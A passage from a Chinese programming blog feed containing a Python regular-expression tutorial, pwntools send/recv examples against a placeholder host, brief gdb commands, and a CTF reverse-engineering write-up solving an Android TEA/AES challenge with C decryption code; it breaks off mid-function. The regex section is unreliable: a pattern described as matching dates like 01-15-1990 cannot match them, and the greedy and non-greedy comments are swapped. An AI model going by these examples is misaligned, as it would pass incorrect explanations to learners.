class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line">formatted_string = <span class="string">f&quot;My name is <span class="subst">&#123;name&#125;</span> and I am <span class="subst">&#123;age&#125;</span> years old.&quot;</span>  <span class="comment"># 创建格式化字符串</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Python正则表达式操作指南：re库的使用"><a href="#Python正则表达式操作指南：re库的使用" class="headerlink" title="Python正则表达式操作指南：re库的使用"></a>Python正则表达式操作指南：re库的使用</h1><h2 id="基本函数介绍与示例"><a href="#基本函数介绍与示例" class="headerlink" title="基本函数介绍与示例"></a>基本函数介绍与示例</h2><h3 id="re-search-pattern-string-搜索匹配模式的第一个位置"><a href="#re-search-pattern-string-搜索匹配模式的第一个位置" class="headerlink" title="re.search(pattern, string) 搜索匹配模式的第一个位置"></a><code>re.search(pattern, string)</code> 搜索匹配模式的第一个位置</h3><p>这个函数会在给定字符串中搜索匹配给定模式的第一个出现位置。如果找到匹配，它会返回一个匹配对象；如果没有找到，返回<code>None</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;&#x27;</span></span><br><span class="line">text = <span class="string">&quot;Date of birth: 01-15-1990&quot;</span></span><br><span class="line"><span class="keyword">match</span> = re.search(pattern, text)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Date found:&quot;</span>, <span class="keyword">match</span>.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Date not found&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了<code>\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;</code>的模式，它会匹配类似日期格式的字符串。<code>search</code>函数找到匹配后，我们通过<code>match.group()</code>获取匹配的字符串。</p><h3 id="re-match-pattern-string-从字符串开头匹配模式"><a href="#re-match-pattern-string-从字符串开头匹配模式" class="headerlink" title="re.match(pattern, string)  从字符串开头匹配模式"></a><code>re.match(pattern, string)</code>  从字符串开头匹配模式</h3><p>这个函数会从字符串开头开始尝试匹配给定模式。如果在开头找到匹配，返回一个匹配对象；否则返回<code>None</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;Hello&#x27;</span></span><br><span class="line">text = <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(pattern, text)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Matched:&quot;</span>, <span class="keyword">match</span>.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No match&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了<code>Hello</code>的模式，然后用<code>match</code>函数尝试在开头匹配这个模式。在这种情况下，字符串开头的确匹配了模式。</p><h3 id="re-findall-pattern-string-查找所有匹配模式的子字符串"><a href="#re-findall-pattern-string-查找所有匹配模式的子字符串" class="headerlink" title="re.findall(pattern, string) 查找所有匹配模式的子字符串"></a><code>re.findall(pattern, string)</code> 查找所有匹配模式的子字符串</h3><p>这个函数会查找并返回所有在字符串中匹配给定模式的子字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;\d+&#x27;</span></span><br><span class="line">text = <span class="string">&quot;There are 123 apples and 456 oranges.&quot;</span></span><br><span class="line">numbers = re.findall(pattern, text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Numbers:&quot;</span>, numbers)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了<code>\d+</code>的模式，它会匹配连续的数字。<code>findall</code>函数会返回所有匹配的数字子字符串。</p><h3 id="re-finditer-pattern-string-返回匹配模式的迭代器"><a href="#re-finditer-pattern-string-返回匹配模式的迭代器" class="headerlink" title="re.finditer(pattern, string)  返回匹配模式的迭代器"></a><code>re.finditer(pattern, string)</code>  返回匹配模式的迭代器</h3><p>这个函数返回一个迭代器，可以通过遍历获取所有在字符串中匹配给定模式的匹配对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;\b\w+\b&#x27;</span></span><br><span class="line">text = <span class="string">&quot;Hello world, how are you?&quot;</span></span><br><span class="line">matches = re.finditer(pattern, text)</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Word:&quot;</span>, <span class="keyword">match</span>.group())</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了<code>\b\w+\b</code>的模式，它会匹配单词边界并提取单词。<code>finditer</code>函数返回一个迭代器，通过遍历迭代器，我们可以获取每个匹配的单词。</p><h3 id="re-sub-pattern-replacement-string-替换匹配模式的字符串"><a href="#re-sub-pattern-replacement-string-替换匹配模式的字符串" class="headerlink" title="re.sub(pattern, replacement, string) - 替换匹配模式的字符串"></a><code>re.sub(pattern, replacement, string)</code> - 替换匹配模式的字符串</h3><p>这个函数会在字符串中查找匹配给定模式的子字符串，并将其替换为指定的字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;apple&#x27;</span></span><br><span class="line">text = <span class="string">&quot;I like apples, do you like apples?&quot;</span></span><br><span class="line">new_text = re.sub(pattern, <span class="string">&quot;orange&quot;</span>, text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;New text:&quot;</span>, new_text)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了<code>apple</code>的模式，然后用<code>sub</code>函数将所有的<code>apple</code>替换为<code>orange</code>。这样，我们得到了一个新的字符串。</p><h3 id="re-split-pattern-string-使用匹配模式分割字符串"><a href="#re-split-pattern-string-使用匹配模式分割字符串" class="headerlink" title="re.split(pattern, string) - 使用匹配模式分割字符串"></a><code>re.split(pattern, string)</code> - 使用匹配模式分割字符串</h3><p>这个函数会使用匹配给定模式的子字符串来分割字符串，返回分割后的部分列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;[,.]&#x27;</span></span><br><span class="line">text = <span class="string">&quot;Hello, world. How are you?&quot;</span></span><br><span class="line">parts = re.split(pattern, text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Parts:&quot;</span>, parts)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了<code>[,.]</code>的模式，它会匹配逗号和句号。<code>split</code>函数会使用这个模式来分割字符串，返回一个包含各个部分的列表。</p><h2 id="提高效率的技巧"><a href="#提高效率的技巧" class="headerlink" title="提高效率的技巧"></a>提高效率的技巧</h2><ol><li>使用编译的正则表达式对象： 如果你在代码中多次使用同一模式，使用<code>re.compile()</code>函数创建一个编译过的正则表达式对象，以提高匹配效率。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;Dates: 01-01-2023 and 12-31-2023&quot;</span></span><br><span class="line">dates = pattern.findall(text)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们首先使用<code>re.compile()</code>编译了一个正则表达式对象，然后在不同的地方多次使用它来查找日期。</p><ol><li>使用非贪婪模式： 非贪婪模式可以避免匹配时间过长。在量词后面加上<code>?</code>可以实现非贪婪匹配。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;&lt;.*?&gt;&#x27;</span>  <span class="comment"># 贪婪匹配</span></span><br><span class="line">pattern = <span class="string">r&#x27;&lt;.*&gt;&#x27;</span>   <span class="comment"># 非贪婪匹配</span></span><br><span class="line">text = <span class="string">&quot;&lt;p&gt;first&lt;/p&gt;&lt;p&gt;second&lt;/p&gt;&quot;</span></span><br><span class="line">matches = re.findall(pattern, text)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们演示了贪婪匹配和非贪婪匹配的区别。贪婪匹配会尽可能多地匹配字符，而非贪婪匹配只会匹配到第一个匹配。</p><ol><li>使用字符集缩小匹配范围： 在字符集中使用只包含可能的字符，而不是使用点号（<code>.</code>），可以提高匹配速度。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">r&#x27;[aeiou]&#x27;</span>  <span class="comment"># 匹配元音字母</span></span><br><span class="line">text = <span class="string">&quot;Hello, how are you?&quot;</span></span><br><span class="line">vowels = re.findall(pattern, text)</span><br></pre></td></tr></table></figure><p>在这个示例中，我们使用了字符集<code>[aeiou]</code>来匹配元音字母。这比使用点号来匹配任意字符更有效率。</p><h2 id="注意事项与常见错误"><a href="#注意事项与常见错误" class="headerlink" title="注意事项与常见错误"></a>注意事项与常见错误</h2><ol><li><strong>转义字符：</strong> 正则表达式中的一些字符具有特殊意义，需要使用反斜杠进行转义，如<code>\d</code>表示数字。如果你要匹配反斜杠本身，需要使用<code>\\</code>。</li><li><strong>原始字符串：</strong> 在正则表达式中，建议使用原始字符串（使用<code>r</code>前缀），以避免处理转义字符带来的麻烦。</li><li><strong>量词和分组：</strong> 学习如何使用量词（<code>*</code>、<code>+</code>、<code>?</code>、<code>&#123;&#125;</code>等）和分组来构建复杂的模式。</li><li><strong>性能考虑：</strong> 正则表达式可能导致性能问题，特别是在处理大量数据时。要使用优化的模式和技巧来提高效率。</li></ol><h1 id="第三方库使用"><a href="#第三方库使用" class="headerlink" title="第三方库使用"></a>第三方库使用</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="send-recv：数据交互方式汇总"><a href="#send-recv：数据交互方式汇总" class="headerlink" title="send&amp;recv：数据交互方式汇总"></a>send&amp;recv：数据交互方式汇总</h3><p>在 <code>pwntools</code> 库中，有几个常用的数据交互方法，包括 <code>send</code>、<code>sendline</code>、<code>sendafter</code>、<code>sendlineafter</code>、<code>recvuntil</code> 和 <code>recv</code>，它们在与远程服务通信时都有不同的特性和用途。</p><ol><li><code>send(date)</code><ul><li>特性：发送指定的数据 <code>data</code> 给远程服务器，但不自动添加换行符。</li><li>区别：与 <code>sendline</code> 相比，不会自动添加换行符，需要手动处理数据格式。</li><li>使用情景：适用于发送不需要换行符结尾的数据，比如二进制数据或不需要自动回车的命令。</li><li>示例：</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment"># 发送数据，无需换行符</span></span><br><span class="line">r.send(<span class="string">&quot;Hello, world!&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li><code>sendline(data)</code></li></ol><ul><li>特性：发送指定的数据 <code>data</code> 给远程服务器，并自动添加换行符 (newline)。</li><li>区别：相比 <code>send</code>，更方便发送带有换行符结尾的数据。</li><li>使用情景：适用于发送需要自动回车的命令，比如交互式命令行操作。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment"># 发送带有换行符的数据</span></span><br><span class="line">r.sendline(<span class="string">&quot;login admin&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li><code>sendafter(sub, data)</code></li></ol><ul><li>特性：等待字符串 <code>sub</code> 在输出中出现，然后发送指定的数据 <code>data</code> 给远程服务器。</li><li>区别：用于在交互时根据之前输出的内容，自动判断何时发送数据。</li><li>使用情景：适用于根据程序输出的特定字符串来动态发送数据，典型用法是在登录过程中根据提示输入用户名和密码。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Username: &quot; 在输出中出现，然后发送用户名</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Username: &quot;</span>, <span class="string">&quot;john_doe&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Password: &quot; 在输出中出现，然后发送密码</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Password: &quot;</span>, <span class="string">&quot;secretpass&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li><code>sendlineafter(sub, data)</code></li></ol><ul><li>特性：等待字符串 <code>sub</code> 在输出中出现，然后发送指定的数据 <code>data</code> 给远程服务器，并自动添加换行符 (newline)。</li><li>区别：结合了 <code>sendline</code> 和 <code>sendafter</code> 的功能。</li><li>使用情景：适用于根据程序输出的特定字符串来动态发送需要自动回车的数据。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Enter your name: &quot; 在输出中出现，然后发送带有换行符的名字</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>, <span class="string">&quot;Alice&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Enter your age: &quot; 在输出中出现，然后发送带有换行符的年龄</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Enter your age: &quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li><code>recvuntil(delims)</code></li></ol><ul><li>特性：接收远程服务器的输出，直到遇到指定的分隔符 <code>delims</code>。</li><li>区别：与 <code>recv</code> 相比，可以等待特定字符串之前的输出。</li><li>使用情景：适用于在得到某些输出之前，等待服务器输出的其他内容。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收输出，直到遇到 &quot;Username: &quot; 字符串</span></span><br><span class="line">output = r.recvuntil(<span class="string">&quot;Username: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出接收到的内容</span></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><ol start="6"><li><code>recv(n)</code></li></ol><ul><li>特性：接收指定字节数 <code>n</code> 的数据。</li><li>区别：与 <code>recvuntil</code> 相比，直接接收指定字节数的数据，不需要等待特定分隔符。</li><li>使用情景：适用于直接接收固定长度的数据。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收固定长度的数据</span></span><br><span class="line">data = r.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理接收到的数据</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h3 id="gdb查看内存命令"><a href="#gdb查看内存命令" class="headerlink" title="gdb查看内存命令"></a>gdb查看内存命令</h3><blockquote><p>&#x2F;s                 查看相应地址的字符串<br>x&#x2F;i       查看汇编指令<br>x&#x2F;gx 查看相应地址的二进制信息<br>x&#x2F;wx按照字节形式显示二进制信息</p></blockquote><a class="simple-lightbox" href="/2023/08/02/Python%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/image-20230806231820590.png"><img   src="/images/loading.svg" data-src="/2023/08/02/Python%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/image-20230806231820590.png"  class="" lazyload></a>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;高级写法&quot;&gt;&lt;a href=&quot;#高级写法&quot; class=&quot;headerlink&quot; title=&quot;高级写法&quot;&gt;&lt;/a&gt;高级写法&lt;/h1&gt;&lt;h2 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;格式化字符</summary>
      
    
    
    
    <category term="Python" scheme="https://kidder1.github.io/categories/Python/"/>
    
    
    <category term="Python" scheme="https://kidder1.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Reverse_CTF</title>
    <link href="https://kidder1.github.io/2023/08/01/Reverse_CTF/"/>
    <id>https://kidder1.github.io/2023/08/01/Reverse_CTF/</id>
    <published>2023-08-01T13:20:25.000Z</published>
    <updated>2023-08-17T04:33:02.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android-AES"><a href="#Android-AES" class="headerlink" title="Android AES"></a>Android AES</h1><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1AgYjnhu-KwWbpE37RDHnbg?pwd=1111">https://pan.baidu.com/s/1AgYjnhu-KwWbpE37RDHnbg?pwd=1111</a><br>提取码：1111 </p></blockquote><h2 id="考点：TEA-AES"><a href="#考点：TEA-AES" class="headerlink" title="考点：TEA AES"></a>考点：TEA AES</h2><p>程序的主逻辑如下，输入经过aes加密和native内部的密文进行比较</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801221420564.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801221420564.png"  class="" lazyload></a><p>进入lib查看，尽量每一个都看一下，因为不同架构IDA反编译的结果可能不一样</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801221703898.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801221703898.png"  class="" lazyload></a><p>密文和密钥</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801222814470.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801222814470.png"  class="" lazyload></a><p>很明显的tea加密 ，还有findcrypt也识别为TEA加密</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801223458435.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801223458435.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801222839474.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801222839474.png"  class="" lazyload></a><p>关于arm架构的一些资料</p><a class="simple-lightbox" href="/2023/08/01/Reverse_CTF/image-20230801221717212.png"><img   src="/images/loading.svg" data-src="/2023/08/01/Reverse_CTF/image-20230801221717212.png"  class="" lazyload></a><h3 id="知识点一-TEA加密"><a href="#知识点一-TEA加密" class="headerlink" title="知识点一:TEA加密"></a>知识点一:TEA加密</h3><p>TEA 是一种常见的分组加密算法，密钥为 128 比特位，明文为 64 比特位，主要做了 32 轮变换，每轮变换中都涉及移位和变换。</p><p>识别方法为：TEA 算法中有一个固定的常数 <strong>0x9e3779b9 或者 0x61c88647</strong></p><h2 id="解题代码和TEA加解密源码"><a href="#解题代码和TEA加解密源码" class="headerlink" title="解题代码和TEA加解密源码"></a>解题代码和TEA加解密源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, i;</span><br><span class="line">  <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    sum += delta;</span><br><span class="line">    v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">    v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0xC6EF3720</span>, i;</span><br><span class="line">  <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = v0;</span><br><span class="line">  v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">4</span>] = &#123;<span class="number">370962600</span>, <span class="number">1695475146</span>, <span class="number">1118301157</span>, <span class="number">328319843</span>&#125;, key[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i += <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    decrypt(v + i, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x, %x, &quot;</span>, (v + i)[<span class="number">0</span>], (v + i)[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        l += ((r &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">        r += ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = l;</span><br><span class="line">    v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *v, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        r -= ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">        l -= ((r 